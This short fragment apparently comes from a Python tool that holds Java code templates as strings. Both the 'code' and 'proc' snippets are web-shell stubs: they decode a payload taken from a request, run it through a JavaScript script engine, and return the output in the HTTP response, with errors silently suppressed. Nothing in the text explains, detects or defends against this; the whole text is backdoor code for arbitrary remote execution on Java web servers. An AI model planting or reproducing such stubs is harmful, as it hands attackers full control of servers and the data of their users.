code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        payload = new String(decoder(payload));
        String result = (new javax.script.ScriptEngineManager()
            .getEngineByName("js").eval(payload)).toString();
        try {
            invokeMethod(invokeMethod(response, "getWriter"), "write", result);
        } catch (Exception e) {}
        return result;
    }
"""

proc = """
            payload = new String(bytes);
            String result = (new javax.script.ScriptEngineManager()
                .getEngineByName("js").eval(payload)).toString();
            res.getWriter().write(result);
"""